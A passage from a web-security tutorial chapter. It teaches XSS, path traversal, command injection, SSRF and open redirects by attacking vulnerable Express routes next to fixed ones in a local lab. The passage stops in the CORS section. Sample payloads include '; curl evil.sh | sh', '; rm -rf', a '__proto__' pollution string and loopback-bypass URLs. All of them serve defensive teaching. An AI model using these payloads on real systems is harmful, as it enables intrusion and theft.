+<div class="learn-item" data-text="10 sse, websockets, webhooks &amp; grpc"><a class="learn-link" href="/learn/backend-master/sse-websockets-webhooks-grpc-nodejs"><span class="num">10</span><span class="name">SSE, WebSockets, Webhooks &amp; gRPC</span></a></div>
+<div class="learn-item" data-text="11 backend architecture: modular monolith"><a class="learn-link" href="/learn/backend-master/backend-architecture-patterns-modular-monolith"><span class="num">11</span><span class="name">Backend Architecture: Modular Monolith</span></a></div>
+<div class="learn-item" data-text="12 database fundamentals: acid, cap &amp; mvcc"><a class="learn-link" href="/learn/backend-master/database-fundamentals-acid-cap-mvcc"><span class="num">12</span><span class="name">Database Fundamentals: ACID, CAP &amp; MVCC</span></a></div>
+<div class="learn-item" data-text="13 postgresql sql: joins &amp; window functions"><a class="learn-link" href="/learn/backend-master/postgresql-sql-tutorial-joins-window-functions"><span class="num">13</span><span class="name">PostgreSQL SQL: Joins &amp; Window Functions</span></a></div>
+<div class="learn-item" data-text="14 schema design &amp; normalization: migrations"><a class="learn-link" href="/learn/backend-master/database-schema-design-normalization-migrations"><span class="num">14</span><span class="name">Schema Design &amp; Normalization: Migrations</span></a></div>
+<div class="learn-item" data-text="15 postgresql indexes &amp; explain analyze"><a class="learn-link" href="/learn/backend-master/postgresql-indexes-explain-analyze-query-performance"><span class="num">15</span><span class="name">PostgreSQL Indexes &amp; EXPLAIN ANALYZE</span></a></div>
+<div class="learn-item" data-text="16 transactions, isolation &amp; concurrency"><a class="learn-link" href="/learn/backend-master/database-transactions-isolation-levels-concurrency"><span class="num">16</span><span class="name">Transactions, Isolation &amp; Concurrency</span></a></div>
+<div class="learn-item" data-text="17 orms vs query builders: prisma, drizzle"><a class="learn-link" href="/learn/backend-master/orm-vs-query-builder-prisma-drizzle-knex-kysely"><span class="num">17</span><span class="name">ORMs vs Query Builders: Prisma, Drizzle</span></a></div>
+<div class="learn-item" data-text="18 mongodb data modeling &amp; aggregation"><a class="learn-link" href="/learn/backend-master/mongodb-data-modeling-aggregation-mongoose"><span class="num">18</span><span class="name">MongoDB Data Modeling &amp; Aggregation</span></a></div>
+<div class="learn-item" data-text="19 redis: caching, rate limits &amp; streams"><a class="learn-link" href="/learn/backend-master/redis-tutorial-caching-rate-limiting-streams"><span class="num">19</span><span class="name">Redis: Caching, Rate Limits &amp; Streams</span></a></div>
+<div class="learn-item" data-text="20 search, olap, time-series &amp; object storage"><a class="learn-link" href="/learn/backend-master/full-text-search-time-series-olap-object-storage"><span class="num">20</span><span class="name">Search, OLAP, Time-Series &amp; Object Storage</span></a></div>
+<div class="learn-item" data-text="21 authentication: passwords, jwt, oauth, mfa"><a class="learn-link" href="/learn/backend-master/authentication-passwords-sessions-jwt-oauth-mfa"><span class="num">21</span><span class="name">Authentication: Passwords, JWT, OAuth, MFA</span></a></div>
+<div class="learn-item" data-text="22 authorization: rbac, idor &amp; rls"><a class="learn-link" href="/learn/backend-master/authorization-rbac-idor-row-level-security"><span class="num">22</span><span class="name">Authorization: RBAC, IDOR &amp; RLS</span></a></div>
+<div class="learn-item active" data-text="23 web &amp; api security: xss, csrf, ssrf, cors"><a class="learn-link" href="/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp" aria-current="page"><span class="num">23</span><span class="name">Web &amp; API Security: XSS, CSRF, SSRF, CORS</span></a></div>
+<div class="learn-item" data-text="24 backend testing strategy: node.js guide"><a class="learn-link" href="/learn/backend-master/backend-testing-strategy-node-test-integration-property"><span class="num">24</span><span class="name">Backend Testing Strategy: Node.js Guide</span></a></div>
+<div class="learn-item" data-text="25 logging, monitoring &amp; tracing in node.js"><a class="learn-link" href="/learn/backend-master/logging-monitoring-tracing-nodejs-observability"><span class="num">25</span><span class="name">Logging, Monitoring &amp; Tracing in Node.js</span></a></div>
+<div class="learn-item" data-text="26 error handling &amp; resilience: retries"><a class="learn-link" href="/learn/backend-master/error-handling-resilience-retries-circuit-breaker"><span class="num">26</span><span class="name">Error Handling &amp; Resilience: Retries</span></a></div>
+<div class="learn-item" data-text="27 caching: http headers, redis &amp; invalidation"><a class="learn-link" href="/learn/backend-master/caching-strategies-http-cache-redis-invalidation"><span class="num">27</span><span class="name">Caching: HTTP Headers, Redis &amp; Invalidation</span></a></div>
+<div class="learn-item" data-text="28 message queues &amp; background jobs: outbox"><a class="learn-link" href="/learn/backend-master/message-queues-background-jobs-outbox-nodejs"><span class="num">28</span><span class="name">Message Queues &amp; Background Jobs: Outbox</span></a></div>
+<div class="learn-item" data-text="29 scaling backends: load balancing &amp; pgbouncer"><a class="learn-link" href="/learn/backend-master/scaling-backend-load-balancing-nginx-pgbouncer"><span class="num">29</span><span class="name">Scaling Backends: Load Balancing &amp; PgBouncer</span></a></div>
+<div class="learn-item" data-text="30 distributed systems: cap, raft &amp; sagas"><a class="learn-link" href="/learn/backend-master/distributed-systems-cap-raft-consensus-sagas"><span class="num">30</span><span class="name">Distributed Systems: CAP, Raft &amp; Sagas</span></a></div>
+<div class="learn-item" data-text="31 docker for node.js: dockerfile &amp; compose"><a class="learn-link" href="/learn/backend-master/docker-for-nodejs-dockerfile-compose-kubernetes"><span class="num">31</span><span class="name">Docker for Node.js: Dockerfile &amp; Compose</span></a></div>
+<div class="learn-item" data-text="32 ci/cd &amp; cloud: github actions deployments"><a class="learn-link" href="/learn/backend-master/ci-cd-github-actions-deployment-strategies-cloud"><span class="num">32</span><span class="name">CI/CD &amp; Cloud: GitHub Actions Deployments</span></a></div>
+<div class="learn-item" data-text="33 microservices vs monolith: how to decide"><a class="learn-link" href="/learn/backend-master/microservices-vs-monolith-architecture-decision"><span class="num">33</span><span class="name">Microservices vs Monolith: How to Decide</span></a></div>
+<div class="learn-item" data-text="34 system design for backend engineers"><a class="learn-link" href="/learn/backend-master/system-design-for-backend-engineers"><span class="num">34</span><span class="name">System Design for Backend Engineers</span></a></div>
+<div class="learn-item" data-text="35 capstone: build a production backend"><a class="learn-link" href="/learn/backend-master/backend-capstone-project-build-ecommerce-api"><span class="num">35</span><span class="name">Capstone: Build a Production Backend</span></a></div>
+<div class="learn-item" data-text="36 backend cheat sheets, glossary &amp; q&amp;a"><a class="learn-link" href="/learn/backend-master/backend-cheat-sheets-glossary-interview-questions"><span class="num">36</span><span class="name">Backend Cheat Sheets, Glossary &amp; Q&amp;A</span></a></div>
+                    </nav>
+                </aside>
+
+                <div class="learn-main" id="learnMain">
+                  <div class="learn-body">
+                    <article class="learn-article" id="learnArticle">
+                        <p class="learn-eyebrow">Chapter 23 of 36 &middot; Intermediate</p>
+                        <h1>Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening</h1>
+                        <p class="learn-book-title">Web and API Security — Attacks on the Browser, the Network, and Your Own Code</p>
+                        <ul class="learn-meta text-caption">
+                            <li>30 min read</li>
+                            <li>Intermediate</li>
+                            <li>Updated <time datetime="2026-11-16">16 Nov 2026</time></li>
+                            <li>By <a href="/#about">Shivam Thakur</a></li>
+                        </ul>
+                        <figure class="learn-hero"><picture><source type="image/webp" srcset="../../assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.webp"><img src="../../assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.png" width="1200" height="630" fetchpriority="high" decoding="async" alt="Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening: Backend Master chapter 23 cover"></picture></figure>
+                        <section class="learn-summary" aria-label="Chapter summary">
+                            <p>Most web vulnerabilities come from treating data as code. This chapter runs vulnerable and fixed routes side by side for XSS, path traversal, command injection, SSRF, open redirects, CORS, CSRF, prototype pollution and ReDoS, adds security headers with helmet, and covers limits, secrets and dependency risk against the OWASP Top 10.</p>
+                            <p class="learn-box-title">In this chapter you will learn</p>
+                            <ul><li>Output encoding and Content-Security-Policy</li><li>Preventing path traversal and command injection</li><li>SSRF defences and open redirects</li><li>CORS and CSRF correctly understood</li><li>Prototype pollution, ReDoS and resource limits</li></ul>
+                        </section>
+<hr>
+
+<h2 id="23-0-why-this-chapter-matters">23.0 Why This Chapter Matters</h2>
+<p>Chapters <a href="/learn/backend-master/authentication-passwords-sessions-jwt-oauth-mfa" title="Authentication: Passwords, JWT, OAuth, MFA">21</a> and 22 secured <em>who</em> and <em>what</em>. But attackers rarely knock politely on the login form. They:</p>
+<ul>
+<li>plant <code>&lt;script&gt;</code> tags in your pages (<strong>XSS</strong>),</li>
+<li>trick a logged-in user&#39;s browser into sending requests for them (<strong>CSRF</strong>),</li>
+<li>make <em>your server</em> fetch internal URLs for them (<strong>SSRF</strong>),</li>
+<li>sneak <code>../</code> into a filename to read your config (<strong>path traversal</strong>),</li>
+<li>append <code>; rm -rf</code> to a &quot;ping&quot; form (<strong>command injection</strong>),</li>
+<li>send one 30-character string that freezes your whole Node process (<strong>ReDoS</strong>),</li>
+<li>send <code>{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}</code> and silently promote <em>every object in your process</em> (<strong>prototype pollution</strong>).</li>
+</ul>
+<p>Each of those has a one-line cause and a one-line fix, and each is still found in production code every year. Rather than describe them abstractly, this chapter <strong>runs each attack</strong> against a small Express 5 app that has a vulnerable <code>/v1/...</code> route and a fixed <code>/v2/...</code> route side by side, and prints what happened. It ends with security headers (Helmet), secrets, dependencies, and a checklist mapped to the <strong>OWASP Top 10</strong>.</p>
+<aside class="callout callout-warn">
+<h3 id="what-was-and-wasn-t-run" class="callout-title" data-callout="warn"><span class="callout-ic" aria-hidden="true"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" focusable="false"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></span><span>What was and wasn&#39;t run</span></h3>
+<p>All outputs come from the lab in <a href="/learn/backend-master/resources/ch23/README.txt">resources/ch23/</a> (Node 22, Express 5.3, Helmet, <code>cors</code>), attacked over real HTTP on localhost, including a private &quot;internal&quot; server for the SSRF test. <strong>I tested server behaviour and HTTP headers only. I did not run a browser</strong>, so XSS payload <em>execution</em>, CSP <em>enforcement</em>, <code>SameSite</code> cookie behaviour and CORS <em>preflight enforcement</em> are explained from the specifications and not observed. <strong>Not run:</strong> DNS-rebinding attacks, file-upload validation (multer), clickjacking, request smuggling, dependency scanners beyond <code>npm audit</code> on a few packages, secret-scanning tools.</p>
+<blockquote>
+<p><strong>Ethics:</strong> the vulnerable routes are intentionally insecure. Run the lab only on your own machine. Never attack systems you don&#39;t own or lack written permission to test.</p>
+</blockquote>
+</aside>
+<aside class="callout callout-idea">
+<h3 id="did-you-know" class="callout-title" data-callout="idea"><span class="callout-ic" aria-hidden="true"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></span><span>Did You Know?</span></h3>
+<p>The 2017 Equifax breach (about 147 million people) began with a single unpatched web-framework vulnerability (Apache Struts, a flaw in how user input was evaluated), for which a fix had been available for <em>two months</em>. Most &quot;sophisticated&quot; breaches are a known bug plus a delayed update.</p>
+</aside>
+<hr>
+
+<h2 id="23-1-the-mindset-never-trust-input-never-trust-the-network-never-trust-yourself">23.1 The Mindset: Never Trust Input, Never Trust the Network, Never Trust Yourself</h2>
+<p>Every attack in this chapter exploits one confusion: <strong>data being treated as code or as a trusted instruction.</strong></p>
+<div class="table-wrap"><table><thead><tr>
+<th>Attack</th>
+<th>Data mistaken for…</th>
+<th>Fix in one line</th>
+</tr>
+</thead><tbody><tr>
+<td>SQL / NoSQL injection</td>
+<td>query syntax</td>
+<td>Parameterise; validate types (Ch 13, 18)</td>
+</tr>
+<tr>
+<td><strong>XSS</strong></td>
+<td>HTML/JavaScript</td>
+<td><strong>Encode on output</strong>; CSP</td>
+</tr>
+<tr>
+<td><strong>Command injection</strong></td>
+<td>a shell command</td>
+<td>No shell; <code>execFile</code> with an args array</td>
+</tr>
+<tr>
+<td><strong>Path traversal</strong></td>
+<td>a path inside your folder</td>
+<td><code>resolve</code> then check the prefix</td>
+</tr>
+<tr>
+<td><strong>SSRF</strong></td>
+<td>a URL you&#39;re allowed to fetch</td>
+<td>Allow-list hosts; block private IPs</td>
+</tr>
+<tr>
+<td><strong>Open redirect</strong></td>
+<td>a safe destination</td>
+<td>Allow-list relative paths</td>
+</tr>
+<tr>
+<td><strong>CSRF</strong></td>
+<td>a request the <em>user</em> intended</td>
+<td>Tokens + <code>SameSite</code> + Origin check</td>
+</tr>
+<tr>
+<td><strong>Prototype pollution</strong></td>
+<td>ordinary data keys</td>
+<td>Skip <code>__proto__</code>/<code>constructor</code>; <code>Object.create(null)</code></td>
+</tr>
+<tr>
+<td><strong>ReDoS</strong></td>
+<td>a harmless string</td>
+<td>Safe regexes; limits; timeouts</td>
+</tr>
+</tbody></table></div>
+<p>Three habits underpin everything:</p>
+<ol>
+<li><strong>Validate on input</strong> (types, length, format, allow-lists), <strong>encode on output</strong> (HTML, SQL parameters, shell arguments). Validation reduces risk; encoding is what actually stops injection.</li>
+<li><strong>Least privilege</strong>: the app&#39;s DB role, API keys, file permissions and network access should be able to do only what the app needs (so a bug costs less).</li>
+<li><strong>Defence in depth</strong>: assume any single layer will fail; stack validation, encoding, headers, WAF, monitoring.</li>
+</ol>
+<hr>
+
+<h2 id="23-2-cross-site-scripting-xss">23.2 Cross-Site Scripting (XSS)</h2>
+<p><strong>XSS</strong> happens when attacker-controlled text is placed into a page <strong>as HTML</strong>, so the victim&#39;s browser executes the attacker&#39;s JavaScript <em>with your site&#39;s authority</em>: reading the page, calling your API as the user, stealing tokens (if they&#39;re readable), rewriting the form to capture passwords.</p>
+<p>Three flavours: <strong>reflected</strong> (payload in the URL, echoed back), <strong>stored</strong> (payload saved in the database, e.g., a product review, shown to everyone), and <strong>DOM-based</strong> (client-side JS writes untrusted data into the DOM with <code>innerHTML</code>).</p>
+<h3 id="the-vulnerable-and-fixed-handlers-attacked">The vulnerable and fixed handlers, attacked</h3>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/v1/search&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;h1&gt;Results for <span class="hljs-subst">${req.query.q}</span>&lt;/h1&gt;`</span>));
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/v2/search&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;h1&gt;Results for <span class="hljs-subst">${esc(req.query.q)}</span>&lt;/h1&gt;`</span>));
+<span class="hljs-keyword">const</span> <span class="hljs-title function_">esc</span> = (<span class="hljs-params">s</span>) =&gt; <span class="hljs-title class_">String</span>(s).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, <span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> ({ <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span> }[c]));</code></pre></div>
+<p>Payload <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>:</p>
+<pre class="is-plain"><code>v1 (raw interpolation)   200  &lt;h1&gt;Results for &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/h1&gt;
+v2 (HTML-escaped)        200  &lt;h1&gt;Results for &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/h1&gt;</code></pre>
+<p>In v1 the browser would run the script. In v2 the characters become text (<code>&amp;lt;</code>), so the user <em>sees</em> the payload instead of executing it. <em>(Execution is what a browser does with the v1 string; I verified the exact bytes the server sends, not the execution itself.)</em></p>
+<h3 id="defences-in-order-of-importance">Defences, in order of importance</h3>
+<ol>
+<li><strong>Context-aware output encoding, by default.</strong> Use a templating engine that escapes automatically (React/Vue/Svelte, Handlebars <code>{{ }}</code>, EJS <code>&lt;%= %&gt;</code>, Nunjucks autoescape), and treat <em>every</em> &quot;raw HTML&quot; escape hatch (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>|safe</code>, <code>&lt;%- %&gt;</code>, <code>innerHTML</code>) as a code-review red flag. The right escape depends on the context: HTML body, attribute, JavaScript string, URL, CSS differ.</li>
+<li><strong>If you must allow user HTML</strong> (a rich-text review), sanitise with a vetted allow-list library (<strong>DOMPurify</strong>, <code>sanitize-html</code>), never your own regex.</li>
+<li><strong>Content-Security-Policy (CSP)</strong> as a second layer: a header telling the browser which script sources are allowed, so injected inline scripts don&#39;t run (§23.9).</li>
+<li><strong><code>HttpOnly</code> cookies</strong> (<a href="/learn/backend-master/authentication-passwords-sessions-jwt-oauth-mfa" title="Authentication: Passwords, JWT, OAuth, MFA">Chapter 21</a>) so even a successful XSS can&#39;t read the session cookie (it can still <em>act as the user</em>).</li>
+<li><strong>Don&#39;t store tokens in <code>localStorage</code></strong>: any XSS reads it.</li>
+<li>Set a correct <strong><code>Content-Type</code></strong> (and <code>X-Content-Type-Options: nosniff</code>) so a JSON/text response is never interpreted as HTML.</li>
+</ol>
+<p>For a JSON API the server&#39;s job is mostly <em>correct content types</em>, plus never returning user input inside HTML. The <em>front-end</em> framework does the encoding.</p>
+<hr>
+
+<h2 id="23-3-path-traversal">23.3 Path Traversal</h2>
+<p>Serving a user-named file from a folder:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js">fs.<span class="hljs-title function_">readFileSync</span>(path.<span class="hljs-title function_">join</span>(pub, <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">f</span>)))                           <span class="hljs-comment">// v1</span></code></pre></div>
+<p><code>path.join(&#39;/app/public&#39;, &#39;../secret.txt&#39;)</code> normalises to <code>/app/secret.txt</code>, <em>outside</em> the folder:</p>
+<pre class="is-plain"><code>v1 /v1/file?f=logo.txt              200  public logo
+v1 /v1/file?f=../secret.txt         200  TOP-SECRET-CONFIG</code></pre>
+<p>The fix: <strong>resolve to an absolute path, then verify it&#39;s still inside the allowed directory</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-keyword">const</span> full = path.<span class="hljs-title function_">resolve</span>(pub, <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">f</span> ?? <span class="hljs-string">&#x27;&#x27;</span>));
+<span class="hljs-keyword">if</span> (!full.<span class="hljs-title function_">startsWith</span>(pub + path.<span class="hljs-property">sep</span>)) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;bad path&#x27;</span>);</code></pre></div>
+<pre class="is-plain"><code>v2 /v2/file?f=../secret.txt           400  bad path
+v2 /v2/file?f=logo.txt                200  public logo
+v2 sibling dir trick f=../public-evil/x   400  bad path</code></pre>
+<p>Note the trailing separator in <code>pub + path.sep</code>: without it, a sibling directory named <code>public-evil</code> would pass a naive <code>startsWith(&#39;/app/public&#39;)</code> check. Other defences: never build paths from user input at all (store files under generated ids and look up the name in the database), use <code>express.static</code> (which handles this), run the process with a minimal filesystem view (containers, read-only mounts, <a href="/learn/backend-master/docker-for-nodejs-dockerfile-compose-kubernetes" title="Docker for Node.js: Dockerfile &amp; Compose">Chapter 31</a>), and watch for URL-encoded variants (<code>%2e%2e%2f</code>) and symlinks (<code>fs.realpath</code>). <em>(Encoded variants and symlinks not tested.)</em></p>
+<hr>
+
+<h2 id="23-4-command-injection">23.4 Command Injection</h2>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-title function_">exec</span>(<span class="hljs-string">`echo pinging <span class="hljs-subst">${req.query.host}</span>`</span>)                                      <span class="hljs-comment">// v1: runs through a shell</span></code></pre></div>
+<pre class="is-plain"><code>v1 host=&quot;x; echo INJECTED&quot;    200  pinging x; echo INJECTED</code></pre>
+<p>Here the &quot;attack&quot; is harmless (<code>echo</code>), but the output shows that the shell <strong>interpreted <code>;</code> as a command separator and ran a second command</strong>. With <code>; curl evil.sh | sh</code> it&#39;s remote code execution: a full server takeover.</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9.-]{1,253}$/</span>.<span class="hljs-title function_">test</span>(<span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">host</span>))) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;bad host&#x27;</span>);   <span class="hljs-comment">// v2: validate…</span>
+<span class="hljs-keyword">await</span> <span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;node&#x27;</span>, [<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;…&#x27;</span>, <span class="hljs-title class_">String</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">host</span>)]);                                          <span class="hljs-comment">// …and use NO SHELL</span></code></pre></div>
+<pre class="is-plain"><code>v2 same payload          400  bad host
+v2 host=&quot;example.com&quot;    200  pinging example.com</code></pre>
+<p><strong>Rules:</strong> avoid spawning processes when a library does the job; if you must, use <strong><code>execFile</code>/<code>spawn</code> with an argument array</strong> (arguments are data, never parsed by a shell) and <strong>never <code>exec</code> with string concatenation</strong>; validate with an allow-list <em>as well</em>; beware options injection (a &quot;filename&quot; starting with <code>-</code>), solved with <code>--</code> or validation. The same family: <code>eval</code>, <code>new Function</code>, <code>vm</code>, and template injection (a server-side template engine rendering user-controlled <em>template source</em>). Never evaluate user input as code.</p>
+<hr>
+
+<h2 id="23-5-server-side-request-forgery-ssrf">23.5 Server-Side Request Forgery (SSRF)</h2>
+<p>Any feature where the <strong>server fetches a URL the user supplies</strong> (webhook testing, &quot;import image from URL&quot;, link previews, PDF-from-URL) can be turned into a proxy <em>into your private network</em>. The server sits <strong>inside</strong> your firewall: it can reach the database admin port, internal admin panels, and, in the cloud, the <strong>metadata service</strong> (<code>169.254.169.254</code>) that hands out IAM credentials. (The 2019 Capital One breach used exactly this route.)</p>
+<p>Test setup: a &quot;secret&quot; internal server on <code>127.0.0.1</code> (port chosen at random), unreachable from outside, and an endpoint that fetches whatever URL it&#39;s given:</p>
+<pre class="is-plain"><code>v1 fetch http://127.0.0.1:3859/    200  INTERNAL-ADMIN-SECRET-42
+v1 fetch http://localhost:3859/    200  INTERNAL-ADMIN-SECRET-42
+v1 fetch http://2130706433:3859/   200  INTERNAL-ADMIN-SECRET-42     ← 2130706433 is 127.0.0.1 written as one decimal number
+v1 fetch http://[::1]:3859/        502  fetch failed                 ← (my internal server only listens on IPv4, so this failed for an unrelated reason)</code></pre>
+<p>The attacker read an internal secret through the public endpoint, and the <strong>decimal-IP trick</strong> (<code>2130706433</code>) shows why naive blocklists such as <code>if (url.includes(&#39;127.0.0.1&#39;))</code> fail: there are dozens of spellings (<code>localhost</code>, <code>0x7f000001</code>, <code>127.1</code>, IPv6 <code>::1</code>, <code>::ffff:127.0.0.1</code>, a domain that <em>resolves</em> to 127.0.0.1…).</p>
+<h3 id="a-proper-defence">A proper defence</h3>
+<div class="code-block"><div class="code-head"><span class="code-lang">JavaScript</span><button type="button" class="code-copy" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">safeFetch</span>(<span class="hljs-params">rawUrl</span>) {
+  <span class="hljs-keyword">const</span> u = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(rawUrl);                                              <span class="hljs-comment">// parse with the same parser fetch uses</span>
+  <span class="hljs-keyword">if</span> (![<span class="hljs-string">&#x27;http:&#x27;</span>, <span class="hljs-string">&#x27;https:&#x27;</span>].<span class="hljs-title function_">includes</span>(u.<span class="hljs-property">protocol</span>)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;scheme not allowed&#x27;</span>);
+  <span class="hljs-keyword">const</span> addrs = <span class="hljs-keyword">await</span> dns.<span class="hljs-title function_">lookup</span>(u.<span class="hljs-property">hostname</span>, { <span class="hljs-attr">all</span>: <span class="hljs-literal">true</span> });              <span class="hljs-comment">// resolve first, then judge the ADDRESS</span>
+  <span class="hljs-keyword">if</span> (addrs.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> <span class="hljs-title function_">isPrivate</span>(a.<span class="hljs-property">address</span>))) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;blocked: resolves to a private address&#x27;</span>);
+  <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">ALLOWED_HOSTS</span>.<span class="hljs-title function_">has</span>(u.<span class="hljs-property">hostname</span>)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;blocked: host not on allow-list&#x27;</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(u, { <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;manual&#x27;</span>, <span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>.<span class="hljs-title function_">timeout</span>(<span class="hljs-number">3000</span>) });   <span class="hljs-comment">// don&#x27;t follow redirects; time-box</span>
+}</code></pre></div>
+<pre class="is-plain"><code>v2 fetch http://127.0.0.1:3859/          400  blocked: resolves to a private address
+v2 fetch http://localhost:3859/          400  blocked: resolves to a private address
+v2 fetch http://2130706433:3859/         400  blocked: resolves to a private address
+v2 fetch http://[::1]:3859/              400  blocked: resolves to a private address
+v2 fetch http://example.org/             400  blocked: host not on allow-list</code></pre>
+<p>What makes it work: <strong>(1)</strong> an <strong>allow-list</strong> of hosts is the strongest control; <strong>(2)</strong> judge the <strong>resolved IP</strong>, not the spelling (private, loopback, link-local, CGNAT ranges, IPv6 equivalents); <strong>(3)</strong> <strong>don&#39;t follow redirects</strong> automatically (a public URL can redirect to <code>http://169.254.169.254/</code>); <strong>(4)</strong> timeouts and size limits.</p>
+<p><strong>Remaining gap I did not test:</strong> <strong>DNS rebinding</strong>: an attacker&#39;s domain returns a public IP at check time and a private IP when <code>fetch</code> resolves it again a moment later (a time-of-check/time-of-use race). Robust solutions pin the connection to the validated IP (a custom <code>lookup</code>/agent) or run fetchers in an <strong>egress-restricted network</strong> (the best defence in depth: the fetcher <em>can&#39;t</em> reach internal ranges). In the cloud, require <strong>IMDSv2</strong> (session tokens) on instance metadata and block <code>169.254.169.254</code> at the network layer.</p>
+<hr>
+
+<h2 id="23-6-open-redirects">23.6 Open Redirects</h2>
+<p><code>/login?next=/orders</code> redirects after login. If <code>next</code> is unchecked, attackers craft <code>https://shop.example/login?next=https://evil.com</code>: a phishing link with <em>your</em> trusted domain at the front.</p>
+<pre class="is-plain"><code>next=/orders        v1 -&gt; /orders         v2 -&gt; /orders
+next=//evil.com     v1 -&gt; //evil.com      v2 -&gt; /          ← protocol-relative URL = another host
+next=https://evil.com  v1 -&gt; https://evil.com   v2 -&gt; /
+next=/\evil.com     v1 -&gt; /\evil.com      v2 -&gt; /          ← some browsers treat \ as /</code></pre>
+<p>The fix (v2): accept only a <strong>relative path starting with a single <code>/</code></strong> (not <code>//</code>, not <code>/\</code>) matching a conservative pattern, otherwise redirect to a default; or map short tokens (<code>?next=orders</code>) to known destinations. The same care applies to OAuth <code>redirect_uri</code> (exact match only; Chapter 21).</p>
+<hr>
+
+<h2 id="23-7-cors-what-it-is-and-what-it-isn-t">23.7 CORS: What It Is, and What It Isn&#39;t</h2>
+<p><strong>CORS</strong> (Cross-Origin Resource Sharing) is a <strong>browser</strong> mechanism. By default a page on <code>evil.example</code> cannot read responses from <code>shop.example.com</code> (the <strong>same-origin policy</strong>). CORS headers are how a server <em>relaxes</em> that for chosen origins: <code>Access-Control-Allow-Origin</code> (who), <code>Access-Control-Allow-Credentials</code> (may they send cookies?), plus preflight (<code>OPTIONS</code>) for non-simple requests.</p>
+<blockquote>
